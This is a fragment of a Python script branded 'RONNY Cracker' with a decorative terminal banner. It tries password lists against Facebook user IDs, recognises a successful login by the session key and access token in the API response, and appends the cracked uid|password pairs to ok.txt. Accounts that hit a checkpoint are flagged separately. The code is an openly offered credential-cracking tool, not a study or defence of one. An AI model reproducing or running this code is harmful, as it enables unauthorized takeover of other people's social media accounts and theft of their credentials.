...
ALL TRICKS MALAGASY BY RONNY

\033[1;90m*******************************************************************************
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : RonnyXtandremo•••••••••••••••••
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : MALAGASY JIABY😻🔑✅👌
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sRONNY Cracker"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ℛℴ𝓃𝓃𝓎] : %s/%s -> \033[0;92m [ ℛℴ𝓃𝓃𝓎-OK:%s ]- \033[0;91m[FAST-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [ℛℴ𝓃𝓃𝓎-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [ℛℴ𝓃𝓃𝓎-CP] %s | %s\033[0;97m         "%(uid, pw))
